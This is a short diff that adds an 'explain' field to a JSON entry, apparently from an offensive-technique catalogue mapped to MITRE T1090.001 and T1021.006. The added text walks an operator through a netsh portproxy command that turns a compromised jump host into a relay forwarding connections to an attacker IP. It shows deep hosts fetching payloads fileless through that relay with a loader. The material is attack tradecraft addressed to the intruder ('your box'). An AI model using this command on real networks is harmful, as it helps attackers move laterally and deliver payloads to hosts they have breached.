@@ -115,5 +115,6 @@
       "MITRE T1090.001",
       "MITRE T1021.006"
     ]
-  }
+  },
+  "explain": "Turns a compromised jump host into a relay so deep hosts that cannot reach your box can fetch payloads:\n  netsh interface portproxy add v4tov4   add an IPv4->IPv4 forward on the jump host\n  listenport=<listen_port> listenaddress=0.0.0.0   accept connections on this port, all interfaces\n  connectport=<dst_port> connectaddress=<attacker_ip>   forward them to your web server\nThen tools on the deep host (Loader.exe -path http://127.0.0.1:<listen_port>/...) reach you through the jump host, fileless."
 }
